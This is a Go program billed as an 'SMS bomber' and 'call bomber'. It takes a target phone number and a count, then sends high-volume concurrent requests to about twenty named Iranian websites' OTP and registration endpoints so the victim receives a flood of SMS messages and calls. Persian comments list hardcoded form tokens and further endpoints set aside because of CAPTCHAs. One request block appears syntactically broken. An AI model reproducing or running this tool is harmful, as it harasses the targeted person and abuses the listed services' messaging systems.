// faghat teste code


package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net" 
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"    
)

func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func sendJSONRequest(ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done() 

	const maxRetries = 3          
	const retryDelay = 2 * time.Second 

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done(): 
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0 
			return
		default:
		}

		jsonData, err := json.Marshal(payload)
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while encoding JSON for %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 { 
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue 
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 { 
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue 
		}
		req.Header.Set("Content-Type", "application/json")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError 
					return
				}
				time.Sleep(retryDelay)
				continue 
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0 
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close() 
		return 
	}
}

func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	const maxRetries = 3           
	const retryDelay = 3 * time.Second 

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done(): 
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0 
			return
		default:

		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating form request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 { 
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue 
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {

			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError 
					return
				}
				time.Sleep(retryDelay)
				continue 
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0 
				return
			} else {

				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close() 
		return 
	}
}

func main() {
	clearScreen()

	fmt.Print("\033[01;32m")
	fmt.Print(`
                                :-.                                   
                         .:   =#-:-----:                              
                           **%@#%@@@#*+==:                            
                       :=*%@@@@@@@@@@@@@@%#*=:                        
                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
`)
	fmt.Print("\033[01;37m")
	fmt.Print(`
           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
            *@@%#             -@@@@@@.            #@@@+             
             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
             :@@*            =%@@@@@@%-  faster    *@@:              
              #@@%         .*@@@@#%@@@%+.         %@@+              
              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
`)
	fmt.Print("\033[01;31m")
	fmt.Print(`
              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
                      #@@@@@@@@@@@@@@@@@@@@@@+                      
                       *@@@@@@@@@@@@@@@@@@@@+                       
                        +@@%*@@%@@@%%@%*@@%=                         
                         +%+ %%.+@%:-@* *%-                          
                          .  %# .%#  %+                              
                             :.  %+  :.                              
                                 -:                                  
`)
	fmt.Print("\033[0m")


	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	var phone string
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

	var speedChoice string
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mChoose speed [medium/fast]: \033[00;36m")
	fmt.Scan(&speedChoice)

	var numWorkers int 

	switch strings.ToLower(speedChoice) { 
	case "fast":

		numWorkers = 100 
		fmt.Println("\033[01;33m[*] Fast mode selected. Using", numWorkers, "workers.\033[0m")
	case "medium":

		numWorkers = 30 
		fmt.Println("\033[01;33m[*] Medium mode selected. Using", numWorkers, "workers.\033[0m")
	default:

		numWorkers = 30 
		fmt.Println("\033[01;31m[-] Invalid speed choice. Defaulting to medium mode using", numWorkers, "workers.\033[0m")
	}


	ctx, cancel := context.WithCancel(context.Background())
	signalChan := make(chan os.Signal, 1)

	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-signalChan
		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
		cancel()
	}()

	tasks := make(chan func(), repeatCount*40)


	var wg sync.WaitGroup

	ch := make(chan int, repeatCount*40)

	for i := 0; i < numWorkers; i++ {
		go func() {
			for task := range tasks {
				task()
			}
		}()
	}

	for i := 0; i < repeatCount; i++ {
// api6.arshiyaniha.com (JSON)
		wg.Add(1)
		tasks <- func() {
			// توجه: در نمونه شما شماره تلفن با "00" شروع میشد، اینجا از ورودی کاربر (phone) استفاده شده.
			// اگر نیاز به فرمت "0098..." دارید، باید اینجا تبدیل انجام دهید: "0098" + strings.TrimPrefix(phone, "0")
			sendJSONRequest(ctx, "https://api6.arshiyaniha.com/api/v2/client/otp/send", map[string]interface{}{
				"cellphone":    phone,
				"country_code": "98",
			}, &wg, ch)
		}

		// melix.shop (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://melix.shop/site/api/v1/user/validate", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}

		// delino.com - PreRegister (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("mobile", phone)
			sendFormRequest(ctx, "https://www.delino.com/User/PreRegister", formData, &wg, ch)
		}

		// delino.com - register (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("mobile", phone)
			sendFormRequest(ctx, "https://www.delino.com/user/register", formData, &wg, ch)
		}

		// api.timcheh.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.timcheh.com/auth/otp/send", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}

		// beta.raghamapp.com (JSON Array Payload)
		wg.Add(1)
		tasks <- func() {
			// توجه: این وب‌سرویس یک آرایه JSON شامل یک شیء ارسال می‌کند، نه فقط یک شیء JSON.
			// تابع sendJSONRequest برای ارسال یک شیء (map[string]interface{}) طراحی شده است.
			// برای ارسال آرایه، باید ساختار payload را به []map[string]interface{} تغییر داده و json.Marshal را روی آن فراخوانی کنید.
			// کد زیر برای ارسال آرایه تغییر داده شده است.
			payload := []map[string]interface{}{
				{
					"phone": "+98" + strings.TrimPrefix(phone, "0"), // نمونه شما +98 داشت
				},
			}
			jsonData, err := json.Marshal(payload) // Marshal کردن آرایه
			if err != nil {
				fmt.Printf("\033[01;31m[-] Error while encoding JSON for %s on retry %d: %v\033[0m\n", "https://beta.raghamapp.com/auth", 1, err) // مدیریت خطای Marshal
				ch <- http.StatusInternalServerError
				return // خروج در صورت خطا
			}

			req, err := http.NewRequestWithContext(ctx, http.MethodPost, "https://beta.raghamapp.com/auth", bytes.NewBuffer(jsonData))
			if err != nil {
				fmt.Printf("\033[01;31m[-] Error while creating request to %s on retry %d: %v\033[0m\n", "https://beta.raghamapp.com/auth", 1, err) // مدیریت خطای ساخت درخواست
				ch <- http.StatusInternalServerError
				return // خروج در صورت خطا
			}
			req.Header.Set("Content-Type", "application/json")

			resp, err := http.DefaultClient.Do(req) // ارسال درخواست
			if err != nil {
				// مدیریت خطاهای شبکه و Context مشابه sendJSONRequest
				if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
					fmt.Printf("\033[01;31m[-] Network error for %s: %v. Retrying is not implemented here, skipping.\033[0m\n", "https://beta.raghamapp.com/auth", err)
					ch <- http.StatusInternalServerError
					return
				} else if ctx.Err() == context.Canceled {
					fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", "https://beta.raghamapp.com/auth")
					ch <- 0
					return
				} else {
					fmt.Printf("\033[01;31m[-] Unretryable error for %s: %v\033[0m\n", "https://beta.raghamapp.com/auth", err)
					ch <- http.StatusInternalServerError
					return
				}
			//}

			ch <- resp.StatusCode // ارسال وضعیت پاسخ
			resp.Body.Close()
			// توجه: منطق تلاش مجدد (Retry) برای این پیاده‌سازی سفارشی اضافه نشده است.
		}()

		// client.api.paklean.com (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("tel", phone) // نام فیلد شماره تلفن در اینجا "tel" است
			sendFormRequest(ctx, "https://client.api.paklean.com/download", formData, &wg, ch)
		}

		// mashinbank.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://mashinbank.com/api2/users/check", map[string]interface{}{
				"mobileNumber": phone,
			}, &wg, ch)
		}

		// takfarsh.com (Form)
		wg.Add(1)
		tasks <- func() {
			// توجه: پارامتر "security" در این درخواست وجود دارد و ممکن است داینامیک باشد.
			// اگر این مقدار ثابت نباشد، این درخواست احتمالا کار نخواهد کرد.
			formData := url.Values{}
			formData.Set("action", "vooroodak__submit-username")
			formData.Set("username", phone) // نام فیلد شماره تلفن در اینجا "username" است
			formData.Set("security", "6b19e18a87") // این مقدار ممکن است نیاز به تولید داینامیک داشته باشد
			sendFormRequest(ctx, "https://takfarsh.com/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// ghasedak24.com (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("mobile", phone)
			sendFormRequest(ctx, "https://ghasedak24.com/user/otp", formData, &wg, ch)
		}

		// dicardo.com (Form)
		wg.Add(1)
		tasks <- func() {
			// توجه: پارامتر "csrf_dicardo_name" در این درخواست وجود دارد و ممکن است داینامیک باشد.
			// اگر این مقدار ثابت نباشد، این درخواست احتمالا کار نخواهد کرد.
			formData := url.Values{}
			formData.Set("csrf_dicardo_name", "0f95d8a7bfbcb67fc92181dc844ab61d") // این مقدار ممکن است نیاز به تولید داینامیک داشته باشد
			formData.Set("phone", phone)
			formData.Set("type", "0")
			formData.Set("codmoaref", "")
			sendFormRequest(ctx, "https://dicardo.com/sendotp", formData, &wg, ch)
		}

		// bit24.cash - Register/Send-Code (POST JSON)
		wg.Add(1)
		tasks <- func() {
			// توجه: این وب‌سرویس یک درخواست GET قبل از این دارد که اطلاعاتی (شاید وضعیت ثبت نام) را چک می‌کند.
			// این درخواست فعلی فقط مرحله POST را انجام می‌دهد و ممکن است بدون مرحله GET کار نکند.
			sendJSONRequest(ctx, "https://bit24.cash/auth/api/sso/v2/users/auth/register/send-code", map[string]interface{}{
				"country_code": "98",
				"mobile":       phone,
			}, &wg, ch)
		}


		// account.bama.ir (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("username", phone) // نام فیلد شماره تلفن در اینجا "username" است
			formData.Set("client_id", "popuplogin")
			sendFormRequest(ctx, "https://account.bama.ir/api/otp/generate/v4", formData, &wg, ch)
		}

		// lms.tamland.ir (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://lms.tamland.ir/api/api/user/signup", map[string]interface{}{
				"Mobile":       phone, // نام فیلد شماره تلفن در اینجا "Mobile" است
				"SchoolId":     -1,
				"consultantId": "tamland",
				"campaign":     "campaign",
				"utmMedium":    "wordpress",
				"utmSource":    "tamland",
				// سایر فیلدهای موجود در Payload اصلی را می‌توانید اینجا اضافه کنید اگر نیاز باشد
			}, &wg, ch)
		}

		// api.zarinplus.com (JSON)
		wg.Add(1)
		tasks <- func() {
			// توجه: در نمونه شما شماره تلفن با "98" شروع میشد، اینجا از ورودی کاربر (phone) استفاده شده.
			// اگر نیاز به فرمت "98912..." دارید، باید اینجا تبدیل انجام دهید: "98" + strings.TrimPrefix(phone, "0")
			sendJSONRequest(ctx, "https://api.zarinplus.com/user/otp/", map[string]interface{}{
				"phone_number": phone,
				"source":       "zarinplus",
			}, &wg, ch)
		}

		// api.abantether.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.abantether.com/api/v2/auths/register/phone/send", map[string]interface{}{
				"phone_number": phone,
			}, &wg, ch)
		}

		// bck.behtarino.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://bck.behtarino.com/api/v1/users/jwt_phone_verification/", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}

		// flightio.com (JSON)
		wg.Add(1)
		tasks <- func() {
			// توجه: این وب‌سرویس شماره تلفن را با فرمت "98-912..." می‌خواهد.
			formattedPhone := "98-" + strings.TrimPrefix(phone, "0")
			sendJSONRequest(ctx, "https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
				"userKey":     formattedPhone, // استفاده از فرمت خواسته شده
				"userKeyType": 1,
			}, &wg, ch)
		}

		// sabziman.com (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("action", "newphoneexist")
			formData.Set("phonenumber", phone) // نام فیلد شماره تلفن در اینجا "phonenumber" است
			sendFormRequest(ctx, "https://sabziman.com/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// www.namava.ir (JSON)
		wg.Add(1)
		tasks <- func() {
			// توجه: این وب‌سرویس شماره تلفن را با فرمت "+98912..." می‌خواهد.
			formattedPhone := "+98" + strings.TrimPrefix(phone, "0")
			sendJSONRequest(ctx, "https://www.namava.ir/api/v1.0/accounts/registrations/by-otp/request", map[string]interface{}{
				"UserName":     formattedPhone, // استفاده از فرمت خواسته شده
				"ReferralCode": nil,
			}, &wg, ch)
		}

		// novinbook.com (Call - Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("route", "account/phone")
			formData.Set("phone", strings.TrimPrefix(phone, "0")) // اغلب این وبسرویس ها شماره را بدون صفر اول میخواهند
			formData.Set("call", "yes") // پارامتر مربوط به درخواست تماس
			sendFormRequest(ctx, "https://novinbook.com/index.php?route=account/phone", formData, &wg, ch)
		}


		// --- URLهایی که ممکن است مشکل داشته باشند ---

		// api.ehteraman.com (2 variations)
		// Request URL: https://api.ehteraman.com/api/request/otp
		// Request Method: POST
		// Payload: {"mobile": "...", "re_token": "..."}
		// توجه: شامل فیلد "re_token" است که به نظر توکن reCAPTCHA می‌آید. نیاز به حل CAPTCHA دارد.

		// kafegheymat.com
		// Request URL: https://kafegheymat.com/shop/getLoginSms
		// Request Method: POST
		// Payload: {"phone": "...", "captcha": "..."}
		// توجه: شامل فیلد "captcha" است که نیاز به حل CAPTCHA دارد.

		// cinematicket.org
		// Request URL: https://cinematicket.org/api/v1/users/signup
		// Request Method: POST
		// Payload: {"phone_number": "...", "recaptcha": "..."}
		// توجه: شامل فیلد "recaptcha" است که نیاز به حل CAPTCHA دارد.

		// mobogift.com
		// Request URL: https://mobogift.com/signin
		// Request Method: POST
		// Form Data: username=...&captcha=...
		// توجه: شامل فیلد "captcha" است که نیاز به حل CAPTCHA دارد.

		// gateway-v2.trip.ir
		// Request URL: https://gateway-v2.trip.ir/api/v1/totp/send-to-phone-and-email
		// Request Method: POST
		// Payload: {"phoneNumber": "...", "token": "..."}
		// توجه: شامل فیلد "token" است که به احتمال زیاد داینامیک بوده و نیاز به دریافت یا تولید در هر بار دارد.

		// api.rokla.ir
		// Request URL: https://api.rokla.ir/user/request/otp/
		// Request Method: POST
		// Payload: {"mobile": "...", "re_token": "..."}
		// توجه: شامل فیلد "re_token" است که به نظر توکن reCAPTCHA می‌آید. نیاز به حل CAPTCHA دارد.

		// www.offdecor.com
		// Request URL: https://www.offdecor.com/index.php?route=account/login/sendCode
		// Request Method: POST
		// Form Data: phone=...&recaptchaToken=...
		// توجه: شامل فیلد "recaptchaToken" است که نیاز به حل CAPTCHA دارد.

		// ketabchi.com (Multi-step & GET)
		// Request 1: GET https://ketabchi.com/api/v1/auth/getCaptcha
		// Request 2: POST https://ketabchi.com/api/v1/auth/requestVerificationCode
		// توجه: این وب‌سرویس فرآیندی دو مرحله‌ای دارد که اول نیاز به یک درخواست GET (برای دریافت توکن CAPTCHA؟) و سپس یک درخواست POST دارد. کد فعلی فقط درخواست‌های POST مستقل را مدیریت می‌کند و نمی‌تواند دنباله‌های چند مرحله‌ای را اجرا کند. همچنین شامل ساختار JSON تو در تو است و نیاز به تابع جدیدی برای GET دارد.

		// bit24.cash (Multi-step & GET)
		// Request 1: GET https://bit24.cash/auth/api/sso/v2/users/auth/check-user-registered?country_code=...&mobile=...
		// Request 2: POST https://bit24.cash/auth/api/sso/v2/users/auth/register/send-code
		// توجه: این وب‌سرویس هم فرآیندی چند مرحله‌ای دارد که شامل یک درخواست GET است که کد فعلی نمی‌تواند آن را مدیریت کند.

		// api.bitpin.org
		// Request URL: https://api.bitpin.org/v3/usr/authenticate/
		// Request Method: POST
		// Payload: {"device_type": "web", "password": "...", "phone": "..."}
		// توجه: این وب‌سرویس برای احراز هویت با رمز عبور است و نه ارسال OTP. استفاده از آن برای SMS Bomber مناسب نیست.

		// api.bahramshop.ir
		// Request URL: https://api.bahramshop.ir/api/user/validate/username
		// Request Method: POST
		// Payload: {"username": "...", "re_token": "..."}
		// توجه: شامل فیلد "re_token" است که به نظر توکن reCAPTCHA می‌آید. نیاز به حل CAPTCHA دارد.

		// auth.bitbarg.com
		// Request URL: https://auth.bitbarg.com/realms/bitbarg/login-actions/authenticate...
		// Request Method: POST
		// Form Data: phoneNumber=...&session_code=...&execution=...&client_id=...&tab_id=...&client_data=...
		// توجه: شامل پارامترهای بسیار داینامیک و وابسته به نشست کاربری است (session_code, execution, tab_id, client_data). مدیریت این‌ها بسیار پیچیده است و نیاز به دریافت این مقادیر قبل از هر درخواست دارد.

		// novinbook.com (SMS)
		// Request URL: https://novinbook.com/index.php?route=account/phone
		// Request Method: POST
		// Form Data: phone=...&g-recaptcha-response=...
		// توجه: شامل فیلد "g-recaptcha-response" است که نیاز به حل CAPTCHA دارد.

	} // --- پایان حلقه‌ی که وظایف را اضافه می‌کند ---

	close(tasks)

	go func() {
		wg.Wait()
		close(ch)
	}()

	for statusCode := range ch {
		if statusCode >= 400 || statusCode == 0 {
			fmt.Println("\033[01;31m[-] Error or Canceled!")
		} else {
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
		}
	}
}
